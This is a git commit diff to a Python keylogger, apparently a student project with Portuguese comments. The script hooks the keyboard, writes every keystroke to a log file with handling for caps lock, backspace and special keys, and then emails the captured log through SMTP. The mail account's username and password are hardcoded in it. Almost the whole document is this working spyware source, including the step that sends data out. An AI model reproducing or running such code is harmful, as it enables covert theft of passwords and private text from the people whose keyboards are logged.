41c0d95fe363e7b7cb2da148c3588496e2c1d0dd
Daniel Lima <danielmlimag@gmail.com>
2021-12-01 11:46:01 -0300

    fix: clean code (remove unecessary key_list and on_release function)

--- keylogger.py
+++ keylogger.py
@@ -12,52 +12,46 @@ def get_capslock_state():
     return hllDll.GetKeyState(VK_CAPITAL)
 
 
-def update_txt_file(key_list):
+def update_txt_file(key):
+    key_string = str(key).replace("'", "")
+    do_nothing = 1
+
     with open(file_path, 'a') as file:
-        print(key_list[-1])
+        # Armazena o estado do capslock
         caps_lock_state = get_capslock_state()
 
-        if key_list[-1] == 'Key.caps_lock':
+        # Atualiza a variável do estado do capslock
+        if key_string == 'Key.caps_lock':
             if caps_lock_state == 0:
                 caps_lock_state == 1
             elif caps_lock_state == 1:
                 caps_lock_state == 0
-        elif (key_list[-1] == 'Key.space'):  # Troca Key.space por ' '
+        # Troca Key.space por ' '
+        elif (key_string == 'Key.space'):
             file.write(' ')
-        elif key_list[-1][
-                0:
-                3] == 'Key':  # Ignora o restante das teclas que começam com Key
-            file.write('(' + key_list[-1] + ')')
-        else:  # Se for uma letra ou número, adiciona o caractere normalmente
-            print('entrou no else')
-            print('caps lock state: ', caps_lock_state)
-            if caps_lock_state == 0:
-                file.write(key_list[-1][1:2])
-            elif caps_lock_state == 1:
-                print('chegou aq')
-                file.write(key_list[-1][1:2].upper())
-
-
-def on_press(key):
-    global x, key_list
-
-    if x == False:
-        key_list.append(f'{key}')
-        if key_list[-1] == 'Key.backspace':
+        # Apaga um caractere
+        elif key_string == 'Key.backspace':
             with open(file_path, 'rb+') as file:
                 file_size = os.path.getsize(file_path)
                 if file_size > 0:
                     file.seek(-1, os.SEEK_END)
                     file.truncate()
-        x = True
+        # Impede a adição da keyword da tecla Shift
+        elif key_string.find('Key.shift') != -1:
+            do_nothing = 1
+        # Representa de forma mais clara o restante das teclas que começam com Key
+        elif key_string.find('Key') != -1:
+            file.write('(' + key_string + ')')
+        # Se for uma letra ou número, adiciona o caractere normalmente
+        else:
+            if caps_lock_state == 0:
+                file.write(key_string)
+            elif caps_lock_state == 1:
+                file.write(key_string.upper())
 
-    update_txt_file(key_list)
 
-
-def on_release(key):
-    global x, key_list
-    if x == True:
-        x = False
+def on_press(key):
+    update_txt_file(key)
 
 
 def send_email(email, password, receiver, subject='(no subject)'):
@@ -78,22 +72,23 @@ def send_email(email, password, receiver, subject='(no subject)'):
         server.login(email, password)
         server.send_message(msg)
 
-    print("Email sent!")
 
-
-key_list = []
 x = False  # Value to if held
 file_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
-do_nothing = 1
 
-print(
-    "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
-)
+print("[+] Keylogger funcionando com sucesso!")
+print(f"[!] Salvando dados no diretório '{file_path}'")
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press) as listener:
     Timer(8, listener.stop).start()
     listener.join()
-    print("[-] Keylogger finalizado!")
 
-send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
-           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
+print("[-] Keylogger finalizado!")
+
+try:
+    send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
+               'd.lima@aln.senaicimatec.edu.br', 'keylogger')
+except:
+    print("Couldn't send email")
+else:
+    print("Email sent!")
